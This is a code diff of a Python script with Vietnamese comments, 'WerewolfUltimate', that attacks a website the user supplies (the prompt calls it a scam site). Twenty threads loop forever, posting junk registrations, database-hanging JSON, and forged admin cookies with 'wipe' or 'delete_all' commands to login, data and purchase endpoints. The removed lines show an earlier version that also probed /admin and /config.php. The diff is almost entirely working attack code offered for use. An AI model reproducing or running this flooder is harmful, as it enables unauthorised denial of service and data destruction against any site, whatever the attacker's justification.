@@ -1,69 +1,62 @@
-import grequests
 import requests
-import random
-import string
+import threading
 import time
+import random
 import sys
 from colorama import Fore, init
 
 init(autoreset=True)
 
-class WerewolfV2:
+class WerewolfUltimate:
     def __init__(self, target):
         self.target = target.rstrip('/')
-        self.headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F)"}
-        self.endpoints = [self.target]
+        self.headers = {"User-Agent": "Mozilla/5.0 (Android 10; Mobile; rv:100.0)"}
+        # Tọa độ các "tử huyệt" từ video và savehack.txt
+        self.endpoints = [
+            "/assets/ajax/login.php",
+            "/assets/ajax/data.php",
+            "/assets/ajax/buy_premium.php"
+        ]
 
-    def rand_str(self, n=15):
-        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
-
-    # PHƯƠNG ÁN 1: Tấn công Đăng nhập & Vượt rào
-    def p_an_1(self, url):
-        return grequests.post(url, data={"user": self.rand_str(), "pass": self.rand_str(), "login": ""}, timeout=1)
-
-    # PHƯƠNG ÁN 2: Đầu độc JSON & Làm treo Database
-    def p_an_2(self, url):
-        return grequests.post(url, json={"id": self.rand_str(50), "data": self.rand_str(100)}, timeout=1)
-
-    # PHƯƠNG ÁN 3: Xác minh Admin & Hủy diệt (Chiến thuật bạn thích nhất)
-    def p_an_3(self, url):
-        # Thử lệnh xóa và kiểm tra thực tế
-        payload = {"action": "delete_all", "confirm": "true", "token": self.rand_str(32)}
-        return grequests.post(url, data=payload, cookies={"admin_session": "1"}, timeout=1)
-
-    def run(self):
-        print(f"{Fore.CYAN}[*] Đang khởi động 3 phương án tổng lực vào: {self.target}")
-        
-        # Bước 1: Mò đường dẫn ẩn (Fuzzing) nhanh không nóng máy
-        print(f"{Fore.YELLOW}[*] Đang quét lỗ hổng ẩn...")
-        common = ["/admin", "/assets/ajax/data.php", "/api/login", "/config.php"]
-        for p in common:
-            try:
-                if requests.get(self.target + p, timeout=2).status_code < 400:
-                    self.endpoints.append(self.target + p)
-            except: pass
-
-        # Bước 2: Tấn công vô tận (Vòng lặp tiết kiệm năng lượng)
+    def attack_logic(self):
         while True:
-            attack_pool = []
-            for url in self.endpoints:
-                # Trộn cả 3 phương án vào một lượt gửi
-                attack_pool.append(self.p_an_1(url))
-                attack_pool.append(self.p_an_2(url))
-                attack_pool.append(self.p_an_3(url))
+            for path in self.endpoints:
+                url = self.target + path
+                try:
+                    # PHƯƠNG ÁN 1: Spam tài khoản rác
+                    requests.post(url, data={"u": "W_wolf"+str(random.randint(1,999)), "p": "P@ss"+str(random.randint(1,999))}, timeout=2)
+                    
+                    # PHƯƠNG ÁN 2: Đầu độc JSON (Làm treo DB)
+                    requests.post(url, json={"id": random.random(), "msg": "clean_by_werewolf"}, timeout=2)
+                    
+                    # PHƯƠNG ÁN 3: Thử quyền Admin & Hủy diệt
+                    requests.post(url, cookies={"admin_login": "true"}, data={"action": "wipe"}, timeout=2)
+                except:
+                    pass
+            
+            # MẸO CỰC QUAN TRỌNG: Nghỉ 0.1s để điện thoại KHÔNG BỊ CỨNG ĐỜ
+            time.sleep(0.1)
 
-            # Bắn hàng loạt nhưng có giới hạn để không lag điện thoại
-            grequests.map(attack_pool)
+    def start(self):
+        print(f"{Fore.CYAN}== WEREWOLF ULTIMATE: 3 PHƯƠNG ÁN ĐANG KÍCH HOẠT ==")
+        print(f"{Fore.YELLOW}[*] Đang oanh tạc mục tiêu: {self.target}")
+        
+        # Tạo 20 luồng tấn công song song (Vừa đủ mạnh, vừa mát máy)
+        for i in range(20):
+            t = threading.Thread(target=self.attack_logic)
+            t.daemon = True
+            t.start()
             
-            # Hiệu ứng trạng thái
-            sys.stdout.write(f"\r{Fore.GREEN}[WEREWOLF]{Fore.WHITE} Đang bắn 3 phương án... | Điện thoại: Mát | Web: Đang sập")
-            sys.stdout.flush()
-            
-            # Nghỉ một chút để CPU điện thoại tản nhiệt (Rất quan trọng)
-            time.sleep(0.05)
+        try:
+            while True:
+                sys.stdout.write(f"\r{Fore.GREEN}[WEREWOLF] Đang bắn tổng lực... Máy: Mượt | CPU: Ổn định")
+                sys.stdout.flush()
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n[!] Dừng tấn công.")
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        bot = WerewolfV2(sys.argv[1])
-        bot.run()
-            
+    target_link = sys.argv[1] if len(sys.argv) > 1 else input("Nhập link web lừa đảo: ")
+    bot = WerewolfUltimate(target_link)
+    bot.start()
+    
